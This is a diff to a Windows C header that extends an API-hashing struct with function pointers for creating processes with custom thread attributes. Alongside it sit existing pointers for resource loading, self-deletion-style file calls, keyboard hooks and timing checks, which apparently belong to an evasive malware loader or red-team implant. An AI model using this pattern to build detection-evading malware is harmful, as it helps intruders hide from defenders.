@@ -33,26 +33,47 @@ typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);
 // GetTickCount64
 typedef ULONGLONG(WINAPI* fnGetTickCount64)();
 
+// GetEnvironmentVariableAHashValue
+typedef DWORD(WINAPI* fnGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
+
+// InitializeProcThreadAttributeList
+typedef BOOL(WINAPI* fnInitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
+
+// UpdateProcThreadAttribute
+typedef BOOL(WINAPI* fnUpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
+
+// CreateProcessA
+typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+
+// DeleteProcThreadAttributeList
+typedef VOID(WINAPI* fnDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
+
 typedef struct _API_HASHING {
 
-	fnFindResourceW					pFindResourceW;
-	fnLoadResource					pLoadResource;
-	fnLockResource					pLockResource;
-	fnSizeofResource				pSizeofResource;
+	fnFindResourceW						pFindResourceW;
+	fnLoadResource						pLoadResource;
+	fnLockResource						pLockResource;
+	fnSizeofResource					pSizeofResource;
 
-	fnOpenProcess                   pOpenProcess;
+	fnOpenProcess						pOpenProcess;
 
-	fnGetModuleFileNameW            pGetModuleFileNameW;
-	fnCreateFileW                   pCreateFileW;
-	fnSetFileInformationByHandle    pSetFileInformationByHandle;
+	fnGetModuleFileNameW				pGetModuleFileNameW;
+	fnCreateFileW						pCreateFileW;
+	fnSetFileInformationByHandle		pSetFileInformationByHandle;
 
-	fnCallNextHookEx                pCallNextHookEx;
-	fnSetWindowsHookExW             pSetWindowsHookExW;
-	fnGetMessageW                   pGetMessageW;
-	fnDefWindowProcW                pDefWindowProcW;
-	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
+	fnCallNextHookEx					pCallNextHookEx;
+	fnSetWindowsHookExW					pSetWindowsHookExW;
+	fnGetMessageW						pGetMessageW;
+	fnDefWindowProcW					pDefWindowProcW;
+	fnUnhookWindowsHookEx				pUnhookWindowsHookEx;
 
-	fnGetTickCount64                pGetTickCount64;
+	fnGetTickCount64					pGetTickCount64;
+
+	fnGetEnvironmentVariableA			pGetEnvironmentVariableA;
+	fnInitializeProcThreadAttributeList pInitializeProcThreadAttributeList;
+	fnUpdateProcThreadAttribute			pUpdateProcThreadAttribute;
+	fnCreateProcessA					pCreateProcessA;
+	fnDeleteProcThreadAttributeList		pDeleteProcThreadAttributeList;
 
 }API_HASHING, * PAPI_HASHING;
 
